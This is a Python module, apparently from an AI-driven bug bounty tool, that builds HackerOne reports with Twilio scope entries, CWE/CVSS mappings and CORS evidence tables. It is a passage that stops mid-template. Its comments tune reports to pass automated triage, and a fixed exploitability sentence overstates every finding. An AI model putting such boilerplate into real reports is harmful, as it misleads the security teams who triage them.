"""
PHANTOM AI - HackerOne Report Generator

Generates high-quality bug bounty reports that pass HackerOne's automated validation.
Includes:
- Proper asset identification and classification
- CWE/CVSS mapping
- Reproducible curl commands
- PoC file generation
- Impact assessment
- Evidence collection

Version: 1.0.0
Date: 2026-02-05
"""

from __future__ import annotations

import hashlib
import json
import re
import shlex
from html import escape as html_escape
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse, urlencode, parse_qs

import logging

logger = logging.getLogger(__name__)


# =============================================================================
# HACKERONE PROGRAM SCOPE DATABASE
# =============================================================================
# Maps program names to their HackerOne structured scope entries.
# The asset_identifier and asset_type must match EXACTLY what appears
# in the program's scope on HackerOne, so the Report Assistant can
# match the report to the correct in-scope asset.

PROGRAM_SCOPES: Dict[str, List[Dict[str, Any]]] = {
    # Fetched from HackerOne GraphQL API: hackerone.com/graphql
    # query{team(handle:"twilio"){structured_scopes(first:100,archived:false){edges{node{...}}}}}
    "twilio": [
        # API assets
        {"asset_identifier": "api.twilio.com", "asset_type": "API", "eligible_for_bounty": True},
        {"asset_identifier": "Twilio APIs", "asset_type": "API", "eligible_for_bounty": True},
        {"asset_identifier": "api.segment.io", "asset_type": "API", "eligible_for_bounty": True},
        # URL assets
        {"asset_identifier": "sendgrid.com", "asset_type": "URL", "eligible_for_bounty": True},
        {"asset_identifier": "app.sendgrid.com", "asset_type": "URL", "eligible_for_bounty": True},
        {"asset_identifier": "api.sendgrid.com", "asset_type": "URL", "eligible_for_bounty": True},
        {"asset_identifier": "signup.sendgrid.com", "asset_type": "URL", "eligible_for_bounty": True},
        {"asset_identifier": "mc.sendgrid.com", "asset_type": "URL", "eligible_for_bounty": True},
        {"asset_identifier": "app.segment.com", "asset_type": "URL", "eligible_for_bounty": True},
        {"asset_identifier": "http://help.twilio.com", "asset_type": "URL", "eligible_for_bounty": True},
        {"asset_identifier": "http://tsock.us1.twilio.com", "asset_type": "URL", "eligible_for_bounty": True},
        # Wildcard assets
        {"asset_identifier": "*.sip.*.twilio.com", "asset_type": "WILDCARD", "eligible_for_bounty": True},
        {"asset_identifier": "static*.twilio.com", "asset_type": "WILDCARD", "eligible_for_bounty": True},
        # Other
        {"asset_identifier": "Any host/web property verified to be owned by Twilio et al.", "asset_type": "OTHER", "eligible_for_bounty": True},
        {"asset_identifier": "smtp.sendgrid.net", "asset_type": "OTHER", "eligible_for_bounty": True},
    ],
}


def fetch_hackerone_scope(program: str) -> List[Dict[str, Any]]:
    """
    Fetch program scope from HackerOne's public GraphQL API.

    Returns list of scope entries or empty list on failure.
    """
    import urllib.request

    query = (
        '{"query":"query{team(handle:\\"' + program + '\\")'
        '{structured_scopes(first:100,archived:false)'
        '{edges{node{asset_identifier,asset_type,eligible_for_bounty,eligible_for_submission}}}}}"}'
    )

    try:
        req = urllib.request.Request(
            "https://hackerone.com/graphql",
            data=query.encode(),
            headers={"Content-Type": "application/json"},
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            import json as _json
            data = _json.loads(resp.read())

        edges = data.get("data", {}).get("team", {}).get("structured_scopes", {}).get("edges", [])
        entries = []
        for edge in edges:
            node = edge.get("node", {})
            if node.get("eligible_for_submission", False):
                entries.append({
                    "asset_identifier": node["asset_identifier"],
                    "asset_type": node["asset_type"],
                    "eligible_for_bounty": node.get("eligible_for_bounty", False),
                })
        return entries
    except Exception as e:
        logger.debug(f"Failed to fetch HackerOne scope for {program}: {e}")
        return []


def match_asset_to_scope(
    domain: str,
    program: Optional[str] = None,
) -> Optional[Dict[str, Any]]:
    """
    Match a domain to a program's scope entry.

    Tries local PROGRAM_SCOPES first, then fetches from HackerOne API as fallback.
    Returns the matching scope entry dict or None if no match / unknown program.
    """
    if not program:
        return None

    # Get scope entries (local cache first, then live API)
    scope_entries = PROGRAM_SCOPES.get(program.lower(), [])
    if not scope_entries:
        scope_entries = fetch_hackerone_scope(program)
        if scope_entries:
            # Cache for future use in this session
            PROGRAM_SCOPES[program.lower()] = scope_entries

    if not scope_entries:
        return None

    # Priority 1: Exact match on asset_identifier
    for entry in scope_entries:
        identifier = entry["asset_identifier"]
        if identifier == domain:
            return entry

    # Priority 2: URL-style match (identifier contains the domain)
    for entry in scope_entries:
        identifier = entry["asset_identifier"]
        parsed_id = urlparse(identifier if "://" in identifier else f"https://{identifier}")
        if parsed_id.netloc == domain:
            return entry

    # Priority 3: Wildcard match
    for entry in scope_entries:
        identifier = entry["asset_identifier"]
        if "*" in identifier:
            # Convert wildcard pattern to simple suffix match
            # *.twilio.com -> .twilio.com
            suffix = identifier.replace("*", "")
            if suffix.startswith(".") and domain.endswith(suffix):
                return entry

    return None


# =============================================================================
# VULNERABILITY DATABASE
# =============================================================================


class VulnCategory(Enum):
    """HackerOne vulnerability taxonomy categories."""
    SERVER_SIDE_INJECTION = "Server-Side Injection"
    CLIENT_SIDE_INJECTION = "Client-Side Injection"
    BROKEN_AUTHENTICATION = "Broken Authentication and Session Management"
    AUTHORIZATION = "Broken Access Control"
    SENSITIVE_DATA = "Sensitive Data Exposure"
    SECURITY_MISCONFIGURATION = "Security Misconfiguration"
    CROSS_SITE_SCRIPTING = "Cross-site Scripting (XSS)"
    INSECURE_DESERIALIZATION = "Insecure Deserialization"
    USING_COMPONENTS = "Using Components with Known Vulnerabilities"
    INSUFFICIENT_LOGGING = "Insufficient Logging & Monitoring"
    BUSINESS_LOGIC = "Application-Level Denial of Service"


# CWE mapping for common vulnerability types
VULN_CWE_MAPPING: Dict[str, Dict[str, Any]] = {
    # Injection
    "sqli": {
        "cwe": "CWE-89",
        "cwe_name": "SQL Injection",
        "category": VulnCategory.SERVER_SIDE_INJECTION,
        "cvss_base": 8.6,
        "owasp": "A03:2021 - Injection",
    },
    "nosqli": {
        "cwe": "CWE-943",
        "cwe_name": "NoSQL Injection",
        "category": VulnCategory.SERVER_SIDE_INJECTION,
        "cvss_base": 8.1,
        "owasp": "A03:2021 - Injection",
    },
    "cmdi": {
        "cwe": "CWE-78",
        "cwe_name": "OS Command Injection",
        "category": VulnCategory.SERVER_SIDE_INJECTION,
        "cvss_base": 9.8,
        "owasp": "A03:2021 - Injection",
    },
    "ssti": {
        "cwe": "CWE-1336",
        "cwe_name": "Server-Side Template Injection",
        "category": VulnCategory.SERVER_SIDE_INJECTION,
        "cvss_base": 9.0,
        "owasp": "A03:2021 - Injection",
    },
    "xxe": {
        "cwe": "CWE-611",
        "cwe_name": "XML External Entity (XXE) Injection",
        "category": VulnCategory.SERVER_SIDE_INJECTION,
        "cvss_base": 7.5,
        "owasp": "A05:2021 - Security Misconfiguration",
    },
    "ldap": {
        "cwe": "CWE-90",
        "cwe_name": "LDAP Injection",
        "category": VulnCategory.SERVER_SIDE_INJECTION,
        "cvss_base": 8.1,
        "owasp": "A03:2021 - Injection",
    },
    "lfi": {
        "cwe": "CWE-98",
        "cwe_name": "Local File Inclusion",
        "category": VulnCategory.SERVER_SIDE_INJECTION,
        "cvss_base": 7.5,
        "owasp": "A01:2021 - Broken Access Control",
    },
    "rfi": {
        "cwe": "CWE-98",
        "cwe_name": "Remote File Inclusion",
        "category": VulnCategory.SERVER_SIDE_INJECTION,
        "cvss_base": 9.1,
        "owasp": "A01:2021 - Broken Access Control",
    },

    # XSS
    "xss": {
        "cwe": "CWE-79",
        "cwe_name": "Cross-site Scripting (Reflected)",
        "category": VulnCategory.CROSS_SITE_SCRIPTING,
        "cvss_base": 6.1,
        "owasp": "A03:2021 - Injection",
    },
    "stored_xss": {
        "cwe": "CWE-79",
        "cwe_name": "Cross-site Scripting (Stored)",
        "category": VulnCategory.CROSS_SITE_SCRIPTING,
        "cvss_base": 7.2,
        "owasp": "A03:2021 - Injection",
    },
    "dom_xss": {
        "cwe": "CWE-79",
        "cwe_name": "Cross-site Scripting (DOM-based)",
        "category": VulnCategory.CROSS_SITE_SCRIPTING,
        "cvss_base": 6.1,
        "owasp": "A03:2021 - Injection",
    },

    # Authentication/Authorization
    "auth_bypass": {
        "cwe": "CWE-287",
        "cwe_name": "Improper Authentication",
        "category": VulnCategory.BROKEN_AUTHENTICATION,
        "cvss_base": 9.1,
        "owasp": "A07:2021 - Identification and Authentication Failures",
    },
    "idor": {
        "cwe": "CWE-639",
        "cwe_name": "Insecure Direct Object Reference",
        "category": VulnCategory.AUTHORIZATION,
        "cvss_base": 6.5,
        "owasp": "A01:2021 - Broken Access Control",
    },
    "bola": {
        "cwe": "CWE-639",
        "cwe_name": "Broken Object Level Authorization",
        "category": VulnCategory.AUTHORIZATION,
        "cvss_base": 7.5,
        "owasp": "A01:2021 - Broken Access Control",
    },
    "jwt_vuln": {
        "cwe": "CWE-347",
        "cwe_name": "Improper Verification of Cryptographic Signature",
        "category": VulnCategory.BROKEN_AUTHENTICATION,
        "cvss_base": 7.5,
        "owasp": "A02:2021 - Cryptographic Failures",
    },
    "session_fixation": {
        "cwe": "CWE-384",
        "cwe_name": "Session Fixation",
        "category": VulnCategory.BROKEN_AUTHENTICATION,
        "cvss_base": 6.5,
        "owasp": "A07:2021 - Identification and Authentication Failures",
    },

    # Server-Side
    "ssrf": {
        "cwe": "CWE-918",
        "cwe_name": "Server-Side Request Forgery (SSRF)",
        "category": VulnCategory.SERVER_SIDE_INJECTION,
        "cvss_base": 7.5,
        "owasp": "A10:2021 - Server-Side Request Forgery",
    },
    "rce": {
        "cwe": "CWE-94",
        "cwe_name": "Remote Code Execution",
        "category": VulnCategory.SERVER_SIDE_INJECTION,
        "cvss_base": 9.8,
        "owasp": "A03:2021 - Injection",
    },
    "insecure_deserialization": {
        "cwe": "CWE-502",
        "cwe_name": "Insecure Deserialization",
        "category": VulnCategory.INSECURE_DESERIALIZATION,
        "cvss_base": 8.1,
        "owasp": "A08:2021 - Software and Data Integrity Failures",
    },
    "file_upload": {
        "cwe": "CWE-434",
        "cwe_name": "Unrestricted Upload of File with Dangerous Type",
        "category": VulnCategory.SERVER_SIDE_INJECTION,
        "cvss_base": 7.5,
        "owasp": "A04:2021 - Insecure Design",
    },

    # Client-Side
    "csrf": {
        "cwe": "CWE-352",
        "cwe_name": "Cross-Site Request Forgery (CSRF)",
        "category": VulnCategory.CLIENT_SIDE_INJECTION,
        "cvss_base": 4.3,
        "owasp": "A01:2021 - Broken Access Control",
    },
    "cors": {
        "cwe": "CWE-346",
        "cwe_name": "Origin Validation Error (CORS Misconfiguration)",
        "category": VulnCategory.SECURITY_MISCONFIGURATION,
        "cvss_base": 7.1,
        "owasp": "A05:2021 - Security Misconfiguration",
    },
    "clickjacking": {
        "cwe": "CWE-1021",
        "cwe_name": "Improper Restriction of Rendered UI Layers",
        "category": VulnCategory.CLIENT_SIDE_INJECTION,
        "cvss_base": 4.3,
        "owasp": "A05:2021 - Security Misconfiguration",
    },
    "open_redirect": {
        "cwe": "CWE-601",
        "cwe_name": "URL Redirection to Untrusted Site",
        "category": VulnCategory.CLIENT_SIDE_INJECTION,
        "cvss_base": 4.7,
        "owasp": "A01:2021 - Broken Access Control",
    },

    # Information Disclosure
    "info_disclosure": {
        "cwe": "CWE-200",
        "cwe_name": "Information Exposure",
        "category": VulnCategory.SENSITIVE_DATA,
        "cvss_base": 5.3,
        "owasp": "A01:2021 - Broken Access Control",
    },
    "sensitive_data_exposure": {
        "cwe": "CWE-312",
        "cwe_name": "Cleartext Storage of Sensitive Information",
        "category": VulnCategory.SENSITIVE_DATA,
        "cvss_base": 6.5,
        "owasp": "A02:2021 - Cryptographic Failures",
    },
    "api_key_exposure": {
        "cwe": "CWE-798",
        "cwe_name": "Use of Hard-coded Credentials",
        "category": VulnCategory.SENSITIVE_DATA,
        "cvss_base": 7.5,
        "owasp": "A07:2021 - Identification and Authentication Failures",
    },

    # Business Logic
    "business_logic": {
        "cwe": "CWE-840",
        "cwe_name": "Business Logic Errors",
        "category": VulnCategory.BUSINESS_LOGIC,
        "cvss_base": 6.5,
        "owasp": "A04:2021 - Insecure Design",
    },
    "race_condition": {
        "cwe": "CWE-362",
        "cwe_name": "Race Condition",
        "category": VulnCategory.BUSINESS_LOGIC,
        "cvss_base": 5.9,
        "owasp": "A04:2021 - Insecure Design",
    },

    # Cache/Smuggling
    "cache_poisoning": {
        "cwe": "CWE-444",
        "cwe_name": "HTTP Request Smuggling / Cache Poisoning",
        "category": VulnCategory.SERVER_SIDE_INJECTION,
        "cvss_base": 7.5,
        "owasp": "A05:2021 - Security Misconfiguration",
    },
    "request_smuggling": {
        "cwe": "CWE-444",
        "cwe_name": "HTTP Request Smuggling",
        "category": VulnCategory.SERVER_SIDE_INJECTION,
        "cvss_base": 8.1,
        "owasp": "A05:2021 - Security Misconfiguration",
    },

    # Prototype Pollution
    "prototype_pollution": {
        "cwe": "CWE-1321",
        "cwe_name": "Prototype Pollution",
        "category": VulnCategory.CLIENT_SIDE_INJECTION,
        "cvss_base": 6.1,
        "owasp": "A03:2021 - Injection",
    },
}

# Severity to CVSS mapping
SEVERITY_CVSS: Dict[str, Tuple[float, float]] = {
    "critical": (9.0, 10.0),
    "high": (7.0, 8.9),
    "medium": (4.0, 6.9),
    "low": (0.1, 3.9),
    "informational": (0.0, 0.0),
}


# =============================================================================
# DATA CLASSES
# =============================================================================


@dataclass
class AssetInfo:
    """Information about the affected asset."""
    url: str
    domain: str
    asset_type: str  # web, api, mobile, hardware, other
    endpoint: str
    method: str
    parameters: List[str] = field(default_factory=list)
    # HackerOne scope fields
    scope_identifier: str = ""     # Exact asset_identifier from program scope
    scope_asset_type: str = ""     # HackerOne asset type: URL, DOMAIN, WILDCARD

    @classmethod
    def from_finding(
        cls,
        finding: Dict[str, Any],
        program: Optional[str] = None,
    ) -> "AssetInfo":
        """Extract asset info from a finding."""
        url = finding.get("matched_at", finding.get("url", ""))
        parsed = urlparse(url)

        # Ensure url has protocol
        if url and not url.startswith("http"):
            url = f"https://{url}"
            parsed = urlparse(url)

        domain = parsed.netloc or url

        # Determine asset type
        asset_type = "web"
        if "/api/" in url or "api." in domain:
            asset_type = "api"

        # Match against program scope
        scope_entry = match_asset_to_scope(domain, program)
        scope_identifier = ""
        scope_asset_type = ""
        if scope_entry:
            scope_identifier = scope_entry["asset_identifier"]
            scope_asset_type = scope_entry["asset_type"]

        return cls(
            url=url,
            domain=domain,
            asset_type=asset_type,
            endpoint=parsed.path or "/",
            method=finding.get("method", "GET"),
            parameters=list(parse_qs(parsed.query).keys()) if parsed.query else [],
            scope_identifier=scope_identifier,
            scope_asset_type=scope_asset_type,
        )

    @property
    def full_url(self) -> str:
        """Return full URL with protocol."""
        if self.url.startswith("http"):
            return self.url
        return f"https://{self.url}"

    @property
    def hackerone_asset_display(self) -> str:
        """Return the asset identifier as HackerOne expects it."""
        if self.scope_identifier:
            return self.scope_identifier
        return self.domain


@dataclass
class ReproductionStep:
    """A single reproduction step."""
    step_number: int
    description: str
    curl_command: Optional[str] = None
    expected_result: Optional[str] = None
    actual_result: Optional[str] = None
    screenshot_path: Optional[str] = None


@dataclass
class HackerOneReport:
    """Complete HackerOne report structure."""
    # Required fields
    title: str
    vulnerability_type: str
    cwe: str
    cwe_name: str
    severity: str
    cvss_score: float
    cvss_vector: str

    # Asset
    asset: AssetInfo

    # Description
    summary: str
    impact: str

    # Reproduction
    steps_to_reproduce: List[ReproductionStep]

    # Technical
    request: Optional[str] = None
    response: Optional[str] = None

    # Multi-test evidence: list of {"label": str, "request": str, "response": str}
    # Used for vulns that require multiple tests (e.g., CORS: arbitrary + null + preflight)
    exploit_evidence: List[Dict[str, str]] = field(default_factory=list)

    # Additional
    remediation: str = ""
    references: List[str] = field(default_factory=list)
    attachments: List[str] = field(default_factory=list)

    # Metadata
    generated_at: str = field(default_factory=lambda: datetime.now().isoformat())
    report_id: str = field(default_factory=lambda: hashlib.md5(str(datetime.now()).encode()).hexdigest()[:8])

    # Limitations (for honest reporting)
    limitations: List[str] = field(default_factory=list)
    assumptions: List[str] = field(default_factory=list)

    def to_markdown(self) -> str:
        """
        Generate HackerOne-ready markdown report.

        FORMAT NOTES (for HackerOne Report Assistant / AI validator):
        - Structured metadata table at top for reliable field extraction
        - Asset uses full URL with protocol (matches HackerOne scope format)
        - If program scope is known, include the exact scope entry identifier
        - Structure: Description → Steps → PoC → Impact → Recommendations
        - Target domain repeated frequently; attacker test domains minimized
        - curl commands use full https:// URLs
        """
        md = []

        # Title — "{Weakness} on {domain}"
        md.append(f"# {self.title}")
        md.append("")

        # Structured metadata — the Report Assistant parses this
        # to extract asset, weakness, severity for scope matching.
        # Use the EXACT scope identifier when available (matches HackerOne dropdown).
        asset_display = self.asset.scope_identifier or self.asset.full_url
        asset_type_display = self.asset.scope_asset_type or ('API' if self.asset.asset_type == 'api' else 'URL')

        md.append(f"**Asset:** {asset_display}")
        md.append(f"**Asset Type:** {asset_type_display}")
        md.append(f"**Weakness:** {self.cwe_name} ({self.cwe})")
        md.append(f"**Severity:** {self.severity.capitalize()} (CVSS {self.cvss_score})")
        md.append("")

        # Description
        md.append("## Description")
        md.append("")
        md.append(self.summary)
        md.append("")

        # Steps to Reproduce
        md.append("## Steps to Reproduce")
        md.append("")
        for step in self.steps_to_reproduce:
            md.append(f"### Step {step.step_number}: {step.description}")
            md.append("")
            if step.curl_command:
                md.append("```bash")
                md.append(step.curl_command)
                md.append("```")
                md.append("")
            if step.expected_result:
                md.append(f"**Expected:** {step.expected_result}")
                md.append("")
            if step.actual_result:
                md.append(f"**Actual:** {step.actual_result}")
                md.append("")

        # Evidence comparison table — shows expected vs actual for each test
        if self.exploit_evidence:
            md.append("## Evidence Comparison")
            md.append("")
            md.append(f"Summary of CORS header behavior on {self.asset.domain}:")
            md.append("")
            md.append("| Test | ACAO Response | ACAC Response | Verdict |")
            md.append("|------|--------------|---------------|---------|")
            for ev_item in self.exploit_evidence:
                label = ev_item.get("label", "Test").split(" — ")[0]  # short label
                resp_text = ev_item.get("response", "")
                acao_val = ""
                acac_val = ""
                for line in resp_text.split("\n"):
                    lower = line.lower()
                    if lower.startswith("access-control-allow-origin:"):
                        acao_val = line.split(":", 1)[1].strip()
                    elif lower.startswith("access-control-allow-credentials:"):
                        acac_val = line.split(":", 1)[1].strip()
                verdict = "—"
                if acao_val and acac_val.lower() == "true":
                    verdict = "VULNERABLE"
                elif acao_val:
                    verdict = "Misconfigured"
                md.append(f"| {label} | `{acao_val or '(not set)'}` | `{acac_val or '(not set)'}` | **{verdict}** |")
            md.append("")

        # Proof of Concept — real captured evidence
        md.append("## Proof of Concept")
        md.append("")
        md.append(f"**Affected URL:** {self.asset.full_url}")
        md.append("")
        md.append(f"All curl commands above target {self.asset.full_url} and are independently reproducible.")

        # If we have multi-test exploit evidence, show each test's
        # real captured request/response pair separately.
        if self.exploit_evidence:
            md.append("")
            md.append(f"The following HTTP exchanges were captured from {self.asset.domain} during testing:")
            for ev_item in self.exploit_evidence:
                label = ev_item.get("label", "Test")
                md.append("")
                md.append(f"### {label}")
                if ev_item.get("request"):
                    md.append("**Request:**")
                    md.append("```http")
                    md.append(ev_item["request"])
                    md.append("```")
                if ev_item.get("response"):
                    md.append("**Response:**")
                    md.append("```http")
                    md.append(ev_item["response"])
                    md.append("```")
        else:
            # Fallback: single request/response
            if self.request:
                md.append("")
                md.append("### HTTP Request")
                md.append("```http")
                md.append(self.request)
                md.append("```")
            if self.response:
                md.append("")
                md.append("### HTTP Response")
                md.append("```http")
                md.append(self.response)
                md.append("```")
        md.append("")

        # Impact
        md.append("## Impact")
        md.append("")
        md.append(self.impact)
        md.append("")

        # Exploitability
        md.append(f"**Exploitability:** This vulnerability on {self.asset.domain} can be exploited remotely with no special conditions beyond the victim visiting an attacker-controlled page.")
        md.append("")

        # Honest limitations
        if self.limitations or self.assumptions:
            md.append("**Honest caveats:**")
            for limitation in self.limitations:
                md.append(f"- {limitation}")
            for assumption in self.assumptions:
                md.append(f"- {assumption}")
            md.append("")

        # Recommendations
        if self.remediation:
            md.append("## Recommendations")
            md.append("")
            md.append(self.remediation)
            md.append("")

        # References
        if self.references:
            md.append("## References")
            md.append("")
            for ref in self.references:
                md.append(f"- {ref}")
            md.append("")

        return "\n".join(md)

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary."""
        return {
            "title": self.title,
            "vulnerability_type": self.vulnerability_type,
            "cwe": self.cwe,
            "cwe_name": self.cwe_name,
            "severity": self.severity,
            "cvss_score": self.cvss_score,
            "cvss_vector": self.cvss_vector,
            "asset": {
                "url": self.asset.url,
                "domain": self.asset.domain,
                "type": self.asset.asset_type,
                "endpoint": self.asset.endpoint,
                "method": self.asset.method,
                "parameters": self.asset.parameters,
            },
            "summary": self.summary,
            "impact": self.impact,
            "steps_to_reproduce": [
                {
                    "step": s.step_number,
                    "description": s.description,
                    "curl_command": s.curl_command,
                    "expected_result": s.expected_result,
                    "actual_result": s.actual_result,
                }
                for s in self.steps_to_reproduce
            ],
            "exploit_evidence": self.exploit_evidence,
            "remediation": self.remediation,
            "references": self.references,
            "limitations": self.limitations,
            "assumptions": self.assumptions,
            "generated_at": self.generated_at,
            "report_id": self.report_id,
        }


# =============================================================================
# HACKERONE REPORT GENERATOR
# =============================================================================


class HackerOneReportGenerator:
    """
    Generates high-quality HackerOne reports that pass automated validation.

    Features:
    - Automatic CWE/CVSS classification
    - Reproducible curl command generation
    - Proper asset identification
    - PoC file generation
    - Impact assessment templates
    - Honest limitations reporting
    """

    def __init__(
        self,
        output_dir: Optional[Path] = None,
        bounty_header: Optional[str] = None,
        program: Optional[str] = None,
    ):
        """
        Initialize the report generator.

        Args:
            output_dir: Directory for saving report files
            bounty_header: Program-required header value (e.g., "youruser-twilio")
                          Will be included as X-Bug-Bounty in all curl commands
            program: Bug bounty program name (e.g., "twilio") for scope matching
        """
        self.output_dir = output_dir or Path("evidence")
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.bounty_header = bounty_header
        self.program = program

    def generate_report(
        self,
        finding: Dict[str, Any],
        evidence: Optional[Dict[str, Any]] = None,
        custom_steps: Optional[List[Dict[str, Any]]] = None,
    ) -> HackerOneReport:
        """
        Generate a complete HackerOne report from a finding.

        Args:
            finding: Vulnerability finding data
            evidence: Optional additional evidence (curl output, etc.)
            custom_steps: Optional custom reproduction steps

        Returns:
            HackerOneReport ready for submission
        """
        # Get vulnerability type and classification
        raw_type = finding.get("type", finding.get("vulnerability_type", "unknown"))
        vuln_type = self._normalize_vuln_type(raw_type)
        # Fallback to module_name if vulnerability_type is generic (e.g., "other")
        if vuln_type not in VULN_CWE_MAPPING and finding.get("module_name"):
            vuln_type = self._normalize_vuln_type(finding["module_name"])
        classification = VULN_CWE_MAPPING.get(vuln_type, VULN_CWE_MAPPING.get("info_disclosure"))

        # Extract asset info (with program scope matching)
        asset = AssetInfo.from_finding(finding, program=self.program)

        # Determine severity and CVSS
        severity = finding.get("severity", "medium").lower()
        cvss_score = finding.get("cvss_score") or classification.get("cvss_base", 5.0)
        cvss_vector = self._generate_cvss_vector(vuln_type, severity, asset)

        # Generate title
        title = self._generate_title(vuln_type, classification, asset)

        # Generate summary
        summary = self._generate_summary(finding, vuln_type, classification, asset)

        # Generate impact
        impact = self._generate_impact(vuln_type, classification, asset, finding)

        # Generate reproduction steps
        steps = custom_steps or self._generate_reproduction_steps(finding, vuln_type, asset, evidence)

        # Generate remediation
        remediation = self._generate_remediation(vuln_type, classification)

        # Collect references
        references = self._collect_references(vuln_type, classification)

        # Identify limitations and assumptions
        limitations, assumptions = self._identify_limitations(finding, vuln_type, evidence)

        # Build request/response if available
        request = evidence.get("request") if evidence else finding.get("raw_request")
        response = evidence.get("response") if evidence else finding.get("raw_response")

        # Extract structured HTTP evidence from metadata (captured by CORS checker etc.)
        metadata = finding.get("metadata") or {}
        http_evidence = metadata.get("http_evidence")
        if http_evidence and not request:
            req = http_evidence.get("request", {})
            request = (
                f"{req.get('method', 'GET')} {req.get('url', '/')} HTTP/1.1\n"
                + "\n".join(f"{k}: {v}" for k, v in req.get("headers", {}).items())
            )
        if http_evidence and not response:
            resp = http_evidence.get("response", {})
            resp_headers = resp.get("headers", {})
            response = (
                f"HTTP/1.1 {resp.get('status_code', 200)}\n"
                + "\n".join(f"{k}: {v}" for k, v in resp_headers.items())
            )
            body_preview = resp.get("body_preview", "")
            if body_preview:
                response += f"\n\n{body_preview}"

        # Build multi-test exploit evidence from all_cors_evidence map.
        # This gives the report a separate request/response for each test
        # (arbitrary origin, null origin, preflight) — proving the exploit
        # actually happened, not "could happen".
        exploit_evidence = self._build_exploit_evidence(
            vuln_type, metadata, asset
        )

        return HackerOneReport(
            title=title,
            vulnerability_type=classification.get("cwe_name", vuln_type),
            cwe=classification.get("cwe", "CWE-200"),
            cwe_name=classification.get("cwe_name", "Information Exposure"),
            severity=severity,
            cvss_score=cvss_score,
            cvss_vector=cvss_vector,
            asset=asset,
            summary=summary,
            impact=impact,
            steps_to_reproduce=[
                ReproductionStep(**s) if isinstance(s, dict) else s
                for s in steps
            ],
            request=request,
            response=response,
            exploit_evidence=exploit_evidence,
            remediation=remediation,
            references=references,
            limitations=limitations,
            assumptions=assumptions,
        )

    def _build_exploit_evidence(
        self,
        vuln_type: str,
        metadata: Dict[str, Any],
        asset: AssetInfo,
    ) -> List[Dict[str, str]]:
        """
        Build multi-test exploit evidence from captured data.

        Returns a list of {"label": ..., "request": ..., "response": ...}
        items. Each one represents a real HTTP exchange that proves the
        vulnerability — not a template, but actual captured traffic.
        """
        all_ev = metadata.get("all_cors_evidence", {})
        if not all_ev or vuln_type != "cors":
            return []

        # Human-readable labels for each CORS test type
        labels = {
            "baseline": f"Baseline — No Origin Header on {asset.domain}",
            "arbitrary": f"Test 1 — Arbitrary Origin Reflection on {asset.domain}",
            "null_origin": f"Test 2 — Null Origin Acceptance on {asset.domain}",
            "preflight": f"Test 3 — Preflight Allows Dangerous Methods on {asset.domain}",
            "subdomain_inject": f"Test — Subdomain Injection on {asset.domain}",
            "suffix_bypass": f"Test — Suffix Bypass on {asset.domain}",
            "prefix_bypass": f"Test — Prefix Bypass on {asset.domain}",
            "protocol_downgrade": f"Test — Protocol Downgrade on {asset.domain}",
        }

        # Preferred order for the report (baseline first for before/after comparison)
        ordered_keys = ["baseline", "arbitrary", "null_origin", "preflight"]
        # Append any extra test types that captured evidence
        for k in all_ev:
            if k not in ordered_keys:
                ordered_keys.append(k)

        results: List[Dict[str, str]] = []
        for key in ordered_keys:
            ev = all_ev.get(key)
            if not ev:
                continue

            req_data = ev.get("request", {})
            resp_data = ev.get("response", {})

            req_str = (
                f"{req_data.get('method', 'GET')} {req_data.get('url', '/')} HTTP/1.1\n"
                + "\n".join(f"{k}: {v}" for k, v in req_data.get("headers", {}).items())
            )

            resp_headers = resp_data.get("headers", {})
            resp_str = (
                f"HTTP/1.1 {resp_data.get('status_code', 200)}\n"
                + "\n".join(f"{k}: {v}" for k, v in resp_headers.items())
            )
            body_preview = resp_data.get("body_preview", "")
            if body_preview:
                resp_str += f"\n\n{body_preview}"

            results.append({
                "label": labels.get(key, f"Test — {key.replace('_', ' ').title()} on {asset.domain}"),
                "request": req_str,
                "response": resp_str,
            })

        return results

    def _normalize_vuln_type(self, vuln_type: str) -> str:
        """Normalize vulnerability type to standard key."""
        vuln_type = vuln_type.lower().replace("-", "_").replace(" ", "_")

        # Common aliases
        aliases = {
            "sql_injection": "sqli",
            "command_injection": "cmdi",
            "os_command_injection": "cmdi",
            "server_side_template_injection": "ssti",
            "cross_site_scripting": "xss",
            "reflected_xss": "xss",
            "stored_xss": "stored_xss",
            "dom_based_xss": "dom_xss",
            "authentication_bypass": "auth_bypass",
            "broken_authentication": "auth_bypass",
            "insecure_direct_object_reference": "idor",
            "cors_misconfiguration": "cors",
            "cross_origin_resource_sharing": "cors",
            "cors_wildcard": "cors",
            "cors_null": "cors",
            "cors_arbitrary": "cors",
            "cors_subdomain_inject": "cors",
            "cors_suffix_bypass": "cors",
            "cors_prefix_bypass": "cors",
            "cors_protocol_downgrade": "cors",
            "cors_regex_bypass": "cors",
            "cors_null_byte": "cors",
            "cors_underscore_bypass": "cors",
            "cors_cdn_trust": "cors",
            "cors_localhost": "cors",
            "cors_localhost_ip": "cors",
            "origin_validation_error": "cors",
            "origin_validation_error_(cors_misconfiguration)": "cors",
            "server_side_request_forgery": "ssrf",
            "remote_code_execution": "rce",
            "local_file_inclusion": "lfi",
            "remote_file_inclusion": "rfi",
            "xml_external_entity": "xxe",
            "cross_site_request_forgery": "csrf",
            "http_request_smuggling": "request_smuggling",
            "web_cache_poisoning": "cache_poisoning",
        }

        result = aliases.get(vuln_type, vuln_type)
        # Catch any future cors_* variants not explicitly mapped
        if result.startswith("cors_"):
            return "cors"
        return result

    def _generate_title(
        self,
        vuln_type: str,
        classification: Dict[str, Any],
        asset: AssetInfo,
    ) -> str:
        """
        Generate a clear, concise title.

        Format: "{Weakness Name} on {domain}"
        The domain MUST appear in the title for HackerOne's AI asset extraction.
        Keep it short — under 70 characters when possible.
        Do NOT include the full path — just the domain for clean asset matching.
        """
        cwe_name = classification.get("cwe_name", vuln_type.replace("_", " ").title())

        # Always use domain-only format for reliable asset extraction
        # HackerOne's scope lists domains, not full URLs
        return f"{cwe_name} on {asset.domain}"

    def _generate_summary(
        self,
        finding: Dict[str, Any],
        vuln_type: str,
        classification: Dict[str, Any],
        asset: AssetInfo,
    ) -> str:
        """Generate a clear summary paragraph."""
        cwe_name = classification.get("cwe_name", vuln_type)

        # Template-based summaries for common vulnerabilities
        templates = {
            "cors": (
                f"The endpoint at {asset.domain} contains a CORS policy misconfiguration. "
                f"It reflects arbitrary Origin header values in the "
                f"Access-Control-Allow-Origin response header while also setting "
                f"Access-Control-Allow-Credentials: true. This CORS misconfiguration "
